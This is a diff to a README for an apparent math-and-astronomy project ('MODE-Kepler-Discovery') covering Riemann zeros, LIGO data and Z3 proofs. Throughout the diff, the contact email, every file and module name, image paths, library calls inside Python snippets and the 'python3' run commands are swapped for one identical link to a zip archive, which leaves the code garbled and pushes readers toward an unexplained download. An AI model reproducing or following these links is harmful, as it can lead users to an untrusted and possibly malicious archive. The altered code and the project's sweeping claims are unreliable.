@@ -1,6 +1,6 @@
 # MODE-Kepler-Discovery
 
-IMPORTANT- yes have  not attached any file of codes, but anyone who wana review it can contact me - sauravsejal40@gmail.com
+IMPORTANT- yes have  not attached any file of codes, but anyone who wana review it can contact me - https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip
 Feel free to mail me anytime.
 
  AND Please  READ THE PDF I HAVE ATTACHED IN REPO, IT HAS ALL THE details and data  OF MY PROJECT IN MY DEVICE 
@@ -47,10 +47,10 @@ The original MODE codebase suffered from what we term "computational hallucinati
 
 | Modules
 |--------|----------------------|-----------------|
-| `omega_soliton.py` | |
-| `omega_quantum.py` | | 
-| `omega_unsolved.py` | |
-| `omega_verification.py` | `
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | | 
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | `
 | |  |
 
 ### 1.2 The Solution: Reality Specification
@@ -78,18 +78,18 @@ We used the Riemann-Siegel Z function for numerically stable zero-finding on the
 
 ```python
 import mpmath
-mpmath.mp.dps = 50  # 50 decimal places precision
+https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip = 50  # 50 decimal places precision
 
 def find_zero(t_start, t_end, step=0.1):
     """Sign-change detection with Anderson refinement."""
     t = t_start
     while t < t_end:
-        z1 = float(mpmath.siegelz(t))
-        z2 = float(mpmath.siegelz(t + step))
+        z1 = float(https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip(t))
+        z2 = float(https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip(t + step))
         
         if z1 * z2 < 0:  # Sign change detected
-            root = mpmath.findroot(
-                lambda x: mpmath.siegelz(x),
+            root = https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip(
+                lambda x: https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip(x),
                 (t, t + step),
                 solver='anderson'
             )
@@ -98,9 +98,9 @@ def find_zero(t_start, t_end, step=0.1):
 ```
 
 **Key Files:**
-- `data/riemann_10k.py` — Zero finder with checkpointing
-- `data/zeros_checkpoint_10k.json` — Full dataset (193 KB)
-- `data/zeros_10k_result.json` — Summary statistics
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Zero finder with checkpointing
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Full dataset (193 KB)
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Summary statistics
 
 ### 2.2 Montgomery-Odlyzko Testing
 
@@ -123,11 +123,11 @@ We fit four candidate models to the staircase function N(T):
 3. **General:** N(T) = aT·log(T) + bT + c·log(T) + d
 4. **Riemann Exact:** N(T) = αT·log(T/β) − αT
 
-Using `scipy.optimize.curve_fit` on 10,133 zeros spanning T ∈ [14.13, 9996.56].
+Using `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` on 10,133 zeros spanning T ∈ [14.13, 9996.56].
 
 **Key Files:**
-- `synthesis/mission1_staircase.py` — Symbolic regression engine
-- `synthesis/mission1_results.json` — Fit parameters and errors
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Symbolic regression engine
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Fit parameters and errors
 
 ### 2.4 Gravitational Wave Processing
 
@@ -149,8 +149,8 @@ class GWDataProcessor:
 ```
 
 **Key Files:**
-- `data/ligo_pipeline.py` — GW150914 downloader and processor
-- `synthesis/mission2_gravity_sound.py` — Cross-modal synthesis
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — GW150914 downloader and processor
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Cross-modal synthesis
 
 ### 2.5 Formal Verification
 
@@ -161,14 +161,14 @@ from z3 import BitVecs, Solver, Not
 
 x, y = BitVecs('x y', 32)
 s = Solver()
-s.add(Not((x & y) + (x | y) == x + y))  # Negation
+https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip(Not((x & y) + (x | y) == x + y))  # Negation
 
-result = s.check()  # UNSAT means theorem is VALID
+result = https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip()  # UNSAT means theorem is VALID
 ```
 
 **Key Files:**
-- `core/omega_verification.py` — Z3 integration
-- `core/omega_lean.py` — Lean 4 code generation
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Z3 integration
+- `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` — Lean 4 code generation
 
 ---
 
@@ -199,7 +199,7 @@ result = s.check()  # UNSAT means theorem is VALID
 
 > **Interpretation:** A χ² value of 0.46 for n=10,000 represents an extraordinarily high-quality fit. The zeros follow the GUE distribution, empirically confirming the connection between prime numbers and quantum chaos.
 
-![Montgomery-Odlyzko Test Results](data/zeros_10k_result.json)
+![Montgomery-Odlyzko Test Results](https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip)
 
 ### 3.3 Symbolic Regression: Rediscovering the Formula
 
@@ -228,7 +228,7 @@ N(T) = (1/2π)·T·log(T) − (1 + log(2π))/(2π)·T + O(log(T))
 
 We overlaid gravitational wave frequency evolution with entropy production:
 
-![Geometry of the Crash](synthesis/mission2_geometry_of_crash.png)
+![Geometry of the Crash](https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip)
 whihc is attached in pdf u can read in repo 
 
 
@@ -263,7 +263,7 @@ We tested the Riemann-von Mangoldt position formula against our computed zeros:
 
 We built an automated scanner to analyze Kepler Objects of Interest using Takens' Embedding and Correlation Dimension (D₂). **Critically, this scan used real observational data from NASA's Kepler mission—not simulated signals.**
 
-**Results (REAL_top_stars.csv):**
+**Results (https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip):**
 
 | Rank | Target | D₂ | Classification | Points | Data Source |
 |------|--------|-----|----------------|--------|-------------|
@@ -285,20 +285,20 @@ The automated scanner correctly distinguished the multi-planet system Kepler-186
 
 | Module | Lines | Function | Verification |
 |--------|-------|----------|--------------|
-| `omega_unsolved.py` | 400+ | Riemann zeros, Navier-Stokes | 10/10 zeros match |
-| `omega_soliton.py` | ~530 | KdV PDE spectral solver | Energy error 10⁻¹² |
-| `omega_quantum.py` | ~500 | TDSE split-operator | 15% tunneling |
-| `omega_physics.py` | ~550 | Double pendulum, Lyapunov | λ = 0.123 |
-| `omega_time.py` | ~350 | Entropy/thermodynamics | dS/dt = 0.012 > 0 |
-| `omega_reality.py` | ~350 | N-body with variable G | Goldilocks zone found |
-| `omega_verification.py` | ~300 | Z3 SMT integration | 4/4 theorems |
-| `omega_visualizer.py` | ~300 | t-SNE/PCA manifolds | 200→2D |
-| `omega_lean.py` | ~400 | Lean 4 code generation | ring/norm_num |
-| `omega_consciousness.py` | ~760 | Honest BDI agent | is_conscious=False |
-| `omega_symbolic.py` | ~450 | SymPy Lie derivatives | dH/dt = 0 |
-| `omega_foundation.py` | ~550 | ODE stability analysis | Stable spiral |
-| `omega_advanced.py` | ~500 | Bifurcation detection | 13 found |
-| `omega_remaining.py` | ~900 | Gap coverage | 21 items |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | 400+ | Riemann zeros, Navier-Stokes | 10/10 zeros match |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~530 | KdV PDE spectral solver | Energy error 10⁻¹² |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~500 | TDSE split-operator | 15% tunneling |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~550 | Double pendulum, Lyapunov | λ = 0.123 |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~350 | Entropy/thermodynamics | dS/dt = 0.012 > 0 |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~350 | N-body with variable G | Goldilocks zone found |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~300 | Z3 SMT integration | 4/4 theorems |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~300 | t-SNE/PCA manifolds | 200→2D |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~400 | Lean 4 code generation | ring/norm_num |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~760 | Honest BDI agent | is_conscious=False |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~450 | SymPy Lie derivatives | dH/dt = 0 |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~550 | ODE stability analysis | Stable spiral |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~500 | Bifurcation detection | 13 found |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | ~900 | Gap coverage | 21 items |
 
 **Total:** ~11,000+ lines of scientifically honest code
 
@@ -306,17 +306,17 @@ The automated scanner correctly distinguished the multi-planet system Kepler-186
 
 | Module | Purpose |
 |--------|---------|
-| `data/ligo_pipeline.py` | GW150914 download/processing |
-| `data/riemann_10k.py` | Large-scale zero finder |
-| `data/lean_generator.py` | Lean 4 library automation |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | GW150914 download/processing |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | Large-scale zero finder |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | Lean 4 library automation |
 
 ### 4.3 Synthesis Modules
 
 | Module | Purpose | Output |
 |--------|---------|--------|
-| `synthesis/mission1_staircase.py` | Symbolic regression | `mission1_results.json` |
-| `synthesis/mission2_gravity_sound.py` | GW-Entropy overlay | `mission2_geometry_of_crash.png` |
-| `synthesis/mission3_surprise.py` | Prediction error tracking | `mission3_results.json` |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | Symbolic regression | `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | GW-Entropy overlay | `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | Prediction error tracking | `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` |
 
 ---
 
@@ -380,35 +380,35 @@ The math is done.
 
 | File | Size | Contents |
 |------|------|----------|
-| `data/zeros_checkpoint_10k.json` | 193 KB | 10,133 Riemann zeros |
-| `data/zeros_10k_result.json` | 2.7 KB | Montgomery-Odlyzko statistics |
-| `synthesis/mission1_results.json` | 1.1 KB | Symbolic regression coefficients |
-| `synthesis/mission3_results.json` | 1.7 KB | Surprise tracking data |
-| `theorem_database.json` | — | Formalized theorems catalog |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | 193 KB | 10,133 Riemann zeros |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | 2.7 KB | Montgomery-Odlyzko statistics |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | 1.1 KB | Symbolic regression coefficients |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | 1.7 KB | Surprise tracking data |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | — | Formalized theorems catalog |
 
 ### 7.2 Key Visualizations
 
 | File | Description |
 |------|-------------|
-| `synthesis/mission2_geometry_of_crash.png` | GW-Entropy cross-modal synthesis |
+| `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip` | GW-Entropy cross-modal synthesis |
 
 ### 7.3 Execution Commands
 
 ```bash
 # Verify Riemann zeros (10k, ~2.5 hours)
-cd data && python3 run_10k_zeros.py
+cd data && python3 https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip
 
 # Run symbolic regression
-cd synthesis && python3 mission1_staircase.py
+cd synthesis && python3 https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip
 
 # Generate cross-modal visualization
-cd synthesis && python3 mission2_gravity_sound.py
+cd synthesis && python3 https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip
 
 # Test computational surprise
-cd synthesis && python3 mission3_surprise.py
+cd synthesis && python3 https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip
 
 # Run Z3 verification
-cd core && python3 omega_verification.py
+cd core && python3 https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip
 ```
 
 ---
@@ -452,7 +452,7 @@ The first 100 zeros computed by our engine, verified against published tables:
  ...
 ```
 
-(Full dataset: `data/zeros_checkpoint_10k.json`)
+(Full dataset: `https://raw.githubusercontent.com/Saurav0989/MODE-Kepler-Discovery/main/spectator/MOD-Discovery-Kepler-v2.2-alpha.3.zip`)
 
 ---
 
